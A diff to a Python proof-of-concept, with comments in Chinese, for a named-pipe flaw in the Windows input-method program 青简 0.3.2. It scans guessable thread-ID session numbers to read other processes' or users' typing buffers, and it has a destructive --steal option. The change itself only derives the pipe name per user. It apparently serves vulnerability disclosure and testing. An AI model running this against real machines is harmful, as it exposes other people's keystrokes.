@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """青简 0.3.2（Windows）命名管道跨连接越权 —— 只读 PoC。
 
-`%LOCALAPPDATA%` 里的 Server 在机器全局的 `\\\\.\\pipe\\qingjian` 上服务，一条连接一个客户端。
+`%LOCALAPPDATA%` 里的 Server 在机器全局的 `\\\\.\\pipe\\qingjian-<用户摘要>` 上服务（0.3.2 及更早是固定的
+`\\\\.\\pipe\\qingjian`，`--pipe` 可以指回去），一条连接一个客户端。
 会话号是 DLL 报上来的**线程号**（`SessionId(GetCurrentThreadId())`），4 对齐、范围很小，猜得到；
 而协议层不校验「这条消息说的会话是不是开在你这连接上」，于是任何本机进程（同一个用户、
 任何 AppContainer 应用，甚至另一个 Windows 用户——管道的 DACL 里有 `Everyone`）都能拿别人的
@@ -33,7 +34,7 @@ import sys
 import threading
 import time
 
-DEFAULT_PIPE = r"\\.\pipe\qingjian"
+from pipe_name import default_pipe_name
 
 # DLL 的线程号从小的开始，4 对齐（Windows 的 TID 是 4 的倍数）。
 TID_START = 4
@@ -122,7 +123,7 @@ def probe(session: int, timeout: float, name: str) -> dict | None:
 
 def main() -> int:
     parser = argparse.ArgumentParser(description="青简命名管道跨连接越权 PoC（只读）")
-    parser.add_argument("--pipe", default=DEFAULT_PIPE, help="管道名")
+    parser.add_argument("--pipe", help="管道名（缺省按当前用户的 SID 派生）")
     parser.add_argument("--limit", type=int, default=TID_LIMIT, help="扫到多大的会话号")
     parser.add_argument("--timeout", type=float, default=0.2, help="每条探测等多久（秒）")
     parser.add_argument("--steal", action="store_true", help="命中后把别人的缓冲区抢过来（破坏性）")
@@ -132,6 +133,8 @@ def main() -> int:
     if os.name != "nt":
         print("这个 PoC 只对 Windows 的命名管道有效", file=sys.stderr)
         return 1
+
+    args.pipe = args.pipe or default_pipe_name()
 
     print(f"扫 {args.pipe} 上的会话号 4..{args.limit}（step 4），每条等 {args.timeout}s")
     print("别的应用正拿青简打字时才会命中；敲着拼音别选词。\n")
